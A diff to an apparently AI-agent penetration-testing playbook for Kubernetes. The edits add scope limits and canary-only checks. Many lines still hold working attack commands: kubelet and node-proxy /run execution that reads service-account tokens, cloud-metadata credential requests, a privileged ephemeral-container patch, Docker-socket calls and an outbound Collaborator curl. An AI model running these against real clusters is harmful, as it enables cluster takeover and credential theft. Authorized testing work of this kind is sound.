@@ -40,7 +40,7 @@ K8s API anonymous cluster-admin = full cluster control. docker.sock + RCE = host
 - **Kubelet `10250` exec/run** — `/run` returns command output directly; `/exec` is a SPDY/WebSocket stream (see Phase 3). Either → RCE in any pod → steal that pod's SA token.
 - **API-server-mediated kubelet RCE** — `/api/v1/nodes/<node>/proxy/run/...` reaches the kubelet *through* the API server using your (low-priv) token; if RBAC grants `nodes/proxy`, you get pod RCE without touching 10250 directly. Primary 2024-2026 vector.
 - **etcd `2379` unauth** — every Secret (SA tokens, TLS keys, app creds) stored, often plaintext (unless `EncryptionConfiguration` is set) → full credential dump.
-- **docker.sock exposure** — SSRF/LFI/RCE reaching `/var/run/docker.sock` → create `--privileged` container, bind-mount host `/` → host root.
+- **docker.sock exposure** — a socket-capable SSRF/RCE primitive reaching `/var/run/docker.sock` → may create containers under the daemon’s authority; rootless/user-namespace/admission controls affect host impact.
 - **Container escape via runc** — Leaky Vessels (CVE-2024-21626): `WORKDIR`/`process.cwd` pointing at a leaked `/proc/self/fd/<n>` host FD → break out of an attacker-controlled image/exec to host root.
 - **SA token abuse** — auto-mounted token at `/var/run/secrets/kubernetes.io/serviceaccount/token`; check its real grants with SelfSubjectRulesReview before claiming impact.
 - **K8s Dashboard skip-login / token-less API** — full cluster management UI reachable unauthenticated.
@@ -51,7 +51,7 @@ K8s API anonymous cluster-admin = full cluster control. docker.sock + RCE = host
 
 K8s findings are RCE/credential-disclosure class. House rule: **prove state change or data read, never infer from a status code.**
 
-- A `200` on `/api/v1/namespaces` does **not** mean cluster-admin. The API server returns `200` with an RBAC-filtered (often empty `items: []`) list to *any* principal that can reach `list namespaces` — anonymous read on a few resources is common and low-impact. Confirm real privilege with **SelfSubjectRulesReview / SelfSubjectAccessReview**, then by actually reading a Secret value.
+- A `200` on `/api/v1/namespaces` does **not** mean cluster-admin. The API server returns `200` with an authorized full list (possibly empty because no resources exist); Kubernetes RBAC does not filter list results per object to *any* principal that can reach `list namespaces` — anonymous read on a few resources is common and low-impact. Confirm real privilege with **SelfSubjectRulesReview / SelfSubjectAccessReview**, then by accessing a pre-approved synthetic canary resource, without extracting production secrets.
 - **10255 (read-only) vs 10250 (exec)** are constantly conflated. 10255 (HTTP, no auth) is info-disclosure only — it has `/pods`, `/stats`, `/metrics`, NO exec/run. 10250 (HTTPS) is where `/run` and `/exec` live. Do not report "kubelet RCE" off a 10255 hit.
 - **Blind/outbound vectors need OOB.** If you exploit SSRF→IMDS→K8s, or a pod's egress, confirm the outbound hop with a Burp Collaborator / interactsh subdomain (e.g. `curl http://<token>.<collab>` from inside the pod via `/run`). A delayed response or an echoed URL is NOT proof.
 - **Impact proof = the artifact.** For exec: the literal `id`/`hostname` output. For etcd/Secret: the decoded token bytes (redact in report). For docker.sock escape: the host file content (`/etc/hostname` of the node, distinct from the container's).
@@ -67,9 +67,9 @@ PORTS="443,6443,8443,8080,10250,10255,10256,2379,2380,4194,9090,9100,30000-30010
 nmap -sV -p $PORTS $TARGET 2>/dev/null | grep open
 
 # API server fingerprint — the /version endpoint is anonymous on most clusters
-curl -sk "https://$TARGET:6443/version"        # {"major":"1","minor":"29","gitVersion":"v1.29.x"...}
-curl -sk "https://$TARGET:6443/api"             # APIVersions list, even pre-auth
-curl -sk "https://$TARGET:6443/healthz"
+curl -sS --cacert "$K8S_CA" "https://$TARGET:6443/version"        # {"major":"1","minor":"29","gitVersion":"v1.29.x"...}
+curl -sS --cacert "$K8S_CA" "https://$TARGET:6443/api"             # APIVersions list, even pre-auth
+curl -sS --cacert "$K8S_CA" "https://$TARGET:6443/healthz"
 
 # Cloud metadata pivot (reach K8s SA / node creds from an SSRF foothold)
 curl -s "http://169.254.169.254/latest/meta-data/iam/security-credentials/" # AWS EKS (IMDSv1)
@@ -88,25 +88,25 @@ Note the `gitVersion` — it gates every CVE below.
 SRV="https://$TARGET:6443"
 
 # 1. What am I? (anonymous → "system:anonymous")
-curl -sk "$SRV/apis/authentication.k8s.io/v1/selfsubjectreviews" -X POST \
+curl -sS --cacert "$K8S_CA" "$SRV/apis/authentication.k8s.io/v1/selfsubjectreviews" -X POST \
   -H 'Content-Type: application/json' \
   -d '{"apiVersion":"authentication.k8s.io/v1","kind":"SelfSubjectReview"}'
 
 # 2. What can I actually DO? (the only honest privilege check)
-curl -sk "$SRV/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" -X POST \
+curl -sS --cacert "$K8S_CA" "$SRV/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" -X POST \
   -H 'Content-Type: application/json' \
   -d '{"kind":"SelfSubjectRulesReview","apiVersion":"authorization.k8s.io/v1","spec":{"namespace":"default"}}'
 
-# 3. Targeted access check for the crown-jewel verbs
-for R in secrets pods nodes/proxy pods/exec; do
-  curl -sk "$SRV/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" -X POST \
-   -H 'Content-Type: application/json' \
-   -d "{\"kind\":\"SelfSubjectAccessReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"spec\":{\"resourceAttributes\":{\"verb\":\"create\",\"resource\":\"${R%%/*}\",\"subresource\":\"${R#*/}\"}}}" \
-   | grep -o '"allowed":[a-z]*' | sed "s#^#$R #"
-done
+# 3. Check one exact approved action and namespace; resource and subresource
+# are separate fields. Do not test "create secrets" as proof of secret-read access.
+curl -sS --cacert "$K8S_CA" "$SRV/apis/authorization.k8s.io/v1/selfsubjectaccessreviews" -X POST \
+  -H 'Content-Type: application/json' \
+  -d "{\"kind\":\"SelfSubjectAccessReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"spec\":{\"resourceAttributes\":{\"namespace\":\"$NS\",\"verb\":\"get\",\"resource\":\"secrets\",\"name\":\"$TEST_SECRET\"}}}"
+# For exec use resource=pods, subresource=exec, verb=create; for node proxy
+# check the exact HTTP-mapped verb, resource=nodes, subresource=proxy.
 
-# 4. Only if access review says allowed — read a real Secret to prove impact
-curl -sk "$SRV/api/v1/secrets" | python3 -c 'import sys,json;d=json.load(sys.stdin);print(len(d.get("items",[])),"secrets")'
+# 4. Only if access review says allowed — read only a designated synthetic test Secret to demonstrate the approved boundary
+curl -sS --cacert "$K8S_CA" "$SRV/api/v1/namespaces/$NS/secrets/$TEST_SECRET" | python3 -c 'import sys,json;d=json.load(sys.stdin);print(len(d.get("items",[])),"secrets")'
 # decode one value (redact before reporting):
 # echo '<base64>' | base64 -d
 ```
@@ -123,15 +123,15 @@ The earlier version of this skill sent `/exec` as a plain `POST` and expected `i
 SRV="https://$TARGET:10250"
 
 # Enumerate pods (auth varies; many kubelets allow anonymous read here)
-curl -sk "$SRV/pods" | python3 -m json.tool 2>/dev/null \
+curl -sS --cacert "$K8S_CA" "$SRV/pods" | python3 -m json.tool 2>/dev/null \
   | grep -E '"namespace"|"name"|"containerName"' | head -40
 
 NS=default; POD=target-pod; CTR=app
 
 # --- PRIMITIVE A: /run — returns command output DIRECTLY (no stream handling) ---
 # This is the simple correct primitive. Use this first.
-curl -sk -X POST "$SRV/run/$NS/$POD/$CTR" -d "cmd=id"
-curl -sk -X POST "$SRV/run/$NS/$POD/$CTR" -d "cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token"
+curl -sS --cacert "$K8S_CA" -X POST "$SRV/run/$NS/$POD/$CTR" -d "cmd=id"
+curl -sS --cacert "$K8S_CA" -X POST "$SRV/run/$NS/$POD/$CTR" -d "cmd=cat /var/run/secrets/kubernetes.io/serviceaccount/token"
 
 # --- PRIMITIVE B: /exec — SPDY/WebSocket stream, NOT a plain POST ---
 # Option 1: kubeletctl handles the stream transport for you (recommended)
@@ -139,11 +139,11 @@ curl -sk -X POST "$SRV/run/$NS/$POD/$CTR" -d "cmd=cat /var/run/secrets/kubernete
 #   kubeletctl --server $TARGET scan rce         # finds every exec-able pod
 # Option 2: raw — the POST returns a 302 to a stream path; -v to see Location, then
 #   read it with a SPDY3.1/WebSocket client (wscat / websocat), e.g.:
-#   curl -sk -i -X POST "$SRV/exec/$NS/$POD/$CTR?command=id&input=1&output=1&tty=0"   # shows 302 Location
+#   curl -sS --cacert "$K8S_CA" -i -X POST "$SRV/exec/$NS/$POD/$CTR?command=id&input=1&output=1&tty=0"   # shows 302 Location
 #   websocat -k "wss://$TARGET:10250/cri/exec/<token-from-Location>"
 
 # Container logs (read-only, no stream)
-curl -sk "$SRV/containerLogs/$NS/$POD/$CTR"
+curl -sS --cacert "$K8S_CA" "$SRV/containerLogs/$NS/$POD/$CTR"
 
 # Read-only kubelet 10255 — INFO DISCLOSURE ONLY, no exec/run. Do not call this "RCE".
 curl -s "http://$TARGET:10255/pods" | python3 -m json.tool 2>/dev/null | head
@@ -160,21 +160,21 @@ When 10250 is firewalled but you hold a token (even a low-priv pod SA) with `nod
 
 ```bash
 SRV="https://$TARGET:6443"; H="-H \"Authorization: Bearer $TOKEN\""
-NODE=$(curl -sk -H "Authorization: Bearer $TOKEN" "$SRV/api/v1/nodes" | grep -o '"name":"[^"]*"' | head -1 | cut -d'"' -f4)
+NODE=$(curl -sS --cacert "$K8S_CA" -H "Authorization: Bearer $TOKEN" "$SRV/api/v1/nodes" | grep -o '"name":"[^"]*"' | head -1 | cut -d'"' -f4)
 
 # /run via the node proxy → output comes straight back
-curl -sk -X POST -H "Authorization: Bearer $TOKEN" \
+curl -sS --cacert "$K8S_CA" -X POST -H "Authorization: Bearer $TOKEN" \
   "$SRV/api/v1/nodes/$NODE/proxy/run/$NS/$POD/$CTR" -d "cmd=id"
 
 # enumerate every pod on a node via the proxy
-curl -sk -H "Authorization: Bearer $TOKEN" "$SRV/api/v1/nodes/$NODE/proxy/pods"
+curl -sS --cacert "$K8S_CA" -H "Authorization: Bearer $TOKEN" "$SRV/api/v1/nodes/$NODE/proxy/pods"
 ```
 `nodes/proxy` in any bound role is effectively node-wide RCE. **CVE-2022-3294** (kube-apiserver node-address validation): an authenticated user could redirect the API server's proxy connection to an arbitrary host/IP it could reach (proxy-to-internal SSRF / node impersonation) — relevant whenever you can influence node addresses or use the proxy subresource.
 
 ---
 
 ## Phase 4b — Ingress-NGINX "IngressNightmare" (CVE-2025-1974)
-An unauthenticated attacker who can reach the ingress-nginx admission controller (`:8443`, usually cluster-internal but sometimes exposed) injects arbitrary NGINX config via a crafted `AdmissionReview` for an Ingress object -> RCE in the controller pod, whose service account is powerful -> full cluster compromise. Fingerprint controller version (`/healthz`, pod image tag) and map to <1.11.5 / <1.12.1. (CVE-2025-1974 with CVE-2025-1097/1098/24513/24514.)
+An unauthenticated attacker who can reach the ingress-nginx admission controller (`:8443`, usually cluster-internal but sometimes exposed) injects arbitrary NGINX config via a crafted `AdmissionReview` for an Ingress object -> RCE in the controller pod, whose service-account grants determine downstream impact. Fingerprint controller version (`/healthz`, pod image tag) and map to <1.11.5 / <1.12.1. (CVE-2025-1974 with CVE-2025-1097/1098/24513/24514.)
 
 ## Phase 5 — etcd Unauth (Port 2379)
 
@@ -206,22 +206,22 @@ API="https://kubernetes.default.svc"
 # Modern tokens are BOUND (projected): they have an audience + short expiry. DECODE before claiming reuse.
 echo "$TOKEN" | cut -d. -f2 | tr '_-' '/+' | base64 -d 2>/dev/null | python3 -m json.tool <!-- security-allowlist: documented payload decoding technique reference, do not execute outside authorized scope -->
 # Look at: "aud" (must match the API server audience to be accepted),
-#          "exp" (projected tokens rotate ~1h — a captured token may already be dead),
+#          "exp" (projected token lifetime is configurable — a captured token may already be dead),
 #          "kubernetes.io/serviceaccount" (pod/node binding — token dies with the pod).
 # If aud is e.g. ["vault"] not the api-server audience, it will NOT authenticate to the API → not cluster impact.
 
 # Honest privilege check, then prove with a real read
-curl -sk "$API/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" -X POST \
+curl -sS --cacert "$K8S_CA" "$API/apis/authorization.k8s.io/v1/selfsubjectrulesreviews" -X POST \
   -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/json' \
   -d "{\"kind\":\"SelfSubjectRulesReview\",\"apiVersion\":\"authorization.k8s.io/v1\",\"spec\":{\"namespace\":\"$NS\"}}"
-curl -sk "$API/api/v1/namespaces/$NS/secrets" -H "Authorization: Bearer $TOKEN"
+curl -sS --cacert "$K8S_CA" "$API/api/v1/namespaces/$NS/secrets" -H "Authorization: Bearer $TOKEN"
 ```
 
-**EphemeralContainers node-shell escalation:** with `pods/ephemeralcontainers` (or pod `create`), attach a debug container that shares the host namespaces to escape the pod:
+**EphemeralContainers node-shell escalation:** ephemeral-container permission alone does not grant host namespaces or privileged admission; a node-debug pod is a separate operation with its own RBAC/admission requirements:
 ```bash
-kubectl debug node/$NODE -it --image=busybox      # mounts host root at /host → chroot /host
+kubectl debug node/"$NODE" -it --image="APPROVED_PINNED_DEBUG_IMAGE" # creates a debug pod; separate create/admission privileges required
 # or patch an ephemeral container with hostPID/privileged via the API:
-curl -sk -X PATCH "$API/api/v1/namespaces/$NS/pods/$POD/ephemeralcontainers" \
+curl -sS --cacert "$K8S_CA" -X PATCH "$API/api/v1/namespaces/$NS/pods/$POD/ephemeralcontainers" \
   -H "Authorization: Bearer $TOKEN" -H 'Content-Type: application/strategic-merge-patch+json' \
   -d '{"spec":{"ephemeralContainers":[{"name":"x","image":"busybox","command":["sleep","1d"],"securityContext":{"privileged":true}}]}}'
 ```
@@ -231,7 +231,7 @@ curl -sk -X PATCH "$API/api/v1/namespaces/$NS/pods/$POD/ephemeralcontainers" \
 ## Phase 7 — Docker Socket Exposure & runc Container Escape
 
 ```bash
-# docker.sock reachable (SSRF unix://, LFI of socket, or RCE on host)
+# docker.sock reachable (SSRF unix://, a socket-capable request primitive (ordinary file reads cannot speak the Docker API), or RCE on host)
 curl -s --unix-socket /var/run/docker.sock http://localhost/v1.41/info
 curl -s --unix-socket /var/run/docker.sock http://localhost/v1.41/containers/json
 
@@ -255,11 +255,11 @@ curl -s --unix-socket /var/run/docker.sock "http://localhost/v1.41/containers/po
 
 ```bash
 # Kubernetes Dashboard — correct API base is /api/v1/... UNDER the dashboard service.
-curl -sk "https://$TARGET:8443/" | grep -i "kubernetes dashboard"
+curl -sS --cacert "$K8S_CA" "https://$TARGET:8443/" | grep -i "kubernetes dashboard"
 # token-less probe (skip-login or anonymous-bound dashboard SA):
-curl -sk "https://$TARGET:8443/api/v1/secret/default"            # secrets list view
-curl -sk "https://$TARGET:8443/api/v1/pod/default"               # pods list view
-curl -sk "https://$TARGET:8443/api/v1/namespace"                 # namespaces
+curl -sS --cacert "$K8S_CA" "https://$TARGET:8443/api/v1/secret/default"            # secrets list view
+curl -sS --cacert "$K8S_CA" "https://$TARGET:8443/api/v1/pod/default"               # pods list view
+curl -sS --cacert "$K8S_CA" "https://$TARGET:8443/api/v1/namespace"                 # namespaces
 # (paths are <resource> not <resource>/<id>; a 200 with real items = unauth dashboard data access)
 
 # Helm 2 / Tiller remnant — gRPC on 44134, historically NO auth → full cluster as Tiller's SA
@@ -267,7 +267,7 @@ nmap -p 44134 -sV $TARGET
 # helm --host $TARGET:44134 ls   # if it answers, Tiller is exposed → install/delete any release
 
 # Validating/Mutating admission webhooks — enumerate to find bypassable policy or SSRF-able webhook URLs
-curl -sk "$SRV/apis/admissionregistration.k8s.io/v1/validatingwebhookconfigurations" -H "Authorization: Bearer $TOKEN"
+curl -sS --cacert "$K8S_CA" "$SRV/apis/admissionregistration.k8s.io/v1/validatingwebhookconfigurations" -H "Authorization: Bearer $TOKEN"
 # A webhook clientConfig.url pointing at an external/attacker-influenced host = SSRF/bypass surface.
 ```
 
@@ -277,7 +277,7 @@ curl -sk "$SRV/apis/admissionregistration.k8s.io/v1/validatingwebhookconfigurati
 
 | K8s finding | Chain to | Impact |
 |-------------|----------|--------|
-| API anon **with confirmed secret read** | extract SA/TLS/app creds | Full cluster compromise |
+| API anon **with confirmed canary secret read** | assess exact resource/credential grants | Impact depends on exposed data and privileges |
 | `nodes/proxy` token | API-server-mediated `/run` → pod RCE → SA token | Node-wide RCE → escalation |
 | Kubelet 10250 `/run` | exec in any pod → steal SA token → API | Cluster privilege escalation |
 | etcd 2379 unauth | dump all Secrets (if unencrypted) → replay token | Full credential dump |
@@ -291,11 +291,11 @@ curl -sk "$SRV/apis/admissionregistration.k8s.io/v1/validatingwebhookconfigurati
 
 ## False-Positive Killers
 
-- **Anon `200` ≠ cluster-admin.** RBAC-filtered list returns `200`/empty `items`. Require SelfSubjectRulesReview to show the verbs, then an actual Secret value read.
+- **Anon `200` ≠ cluster-admin.** A permitted list can be empty because no objects exist; RBAC does not silently filter a list per object. Require SelfSubjectRulesReview to show the verbs, then an approved canary-resource access check.
 - **10255 ≠ 10250.** Read-only kubelet has no exec/run. "Kubelet RCE" must come from a `/run` output or a completed `/exec` stream on 10250.
 - **`/exec` plain-POST returns 302, not output.** Seeing no body is NOT "patched" — follow the stream (kubeletctl/websocat) before concluding either way.
 - **Projected/bound SA token may be dead or wrong-audience.** Decode `exp` and `aud`; a Vault/OIDC-audience token will not authenticate to the API server.
-- **etcd plaintext assumption.** If `EncryptionConfiguration` is enabled, Secret values in etcd are ciphertext — don't claim "plaintext secrets" without showing decoded bytes.
+- **etcd plaintext assumption.** If `EncryptionConfiguration` is enabled, only resources covered by an effective encryption provider configuration are encrypted; identity providers, migration and historical data must be checked — don't claim "plaintext secrets" without showing decoded bytes.
 - **Version-gated CVEs.** Confirm `gitVersion` (Phase 1) / runc version before asserting CVE-2018-1002105, -2024-21626, -2019-5736, etc. A version match is a lead; the PoC output is the proof.
 - **Dashboard `200` on the HTML shell** is just the login page; only a `200` with real resource JSON under `/api/v1/<resource>/<ns>` proves token-less data access.
 
@@ -303,7 +303,7 @@ curl -sk "$SRV/apis/admissionregistration.k8s.io/v1/validatingwebhookconfigurati
 
 ## Validation Checklist
 
-- [ ] **API anon:** SelfSubjectRulesReview shows privileged verbs AND a real Secret value was read (redacted).
+- [ ] **API anon:** SelfSubjectRulesReview shows privileged verbs AND an approved synthetic canary Secret was read (redacted).
 - [ ] **Kubelet:** literal `id`/`hostname` output returned from 10250 `/run`, or a completed `/exec` stream — not a bare 302.
 - [ ] **nodes/proxy RCE:** command output returned through `/api/v1/nodes/<node>/proxy/run/...` with your token.
 - [ ] **etcd:** decoded Secret bytes shown (proves unencrypted + readable), not just a key listing.
@@ -335,3 +335,7 @@ cat scope.txt  # target list from the authorized engagement brief
 ```
 
 > Adapted from [elementalsouls/Claude-BugHunter](https://github.com/elementalsouls/Claude-BugHunter) (MIT); frontmatter, When to Use/Limitations, and safety boundaries added for upstream compliance. Docs-only import: executable helpers, commands, engine, and research assets not bundled.
+
+## Scope, transport and interpretation limits
+
+Set the approved API/node origin, namespace, synthetic canary name and cluster CA explicitly; do not infer scope from an environment variable or follow out-of-scope redirects. Add bounded connection/read times to sketches before use. The credential-dump, metadata-token, broad etcd-prefix, privileged-container and host-write examples are escalation actions requiring separately explicit engagement approval; prefer access reviews and controlled canaries, and stop at the agreed proof. SelfSubjectRulesReview may be incomplete and is namespace scoped; SelfSubjectAccessReview evaluates one exact request and does not establish cluster-admin. Node proxy grants are powerful but depend on verb, node identity, admission and kubelet runtime/configuration; `/run` and stream responses are version-specific, not universally guaranteed 302/output. Pod-create/ephemeral permissions do not automatically bypass Pod Security or grant host root. Docker rootless/user namespaces and runtime mitigations change escape impact. CVE/version/banner matches are leads, not verified exploitation. A successful synthetic Secret read is a disclosure finding, not proof of every credential or full cluster takeover. Keep tokens/headers/private data out of console and reports, use minimum data, clean up approved test resources, and never download or execute public exploit code as an implicit next step.
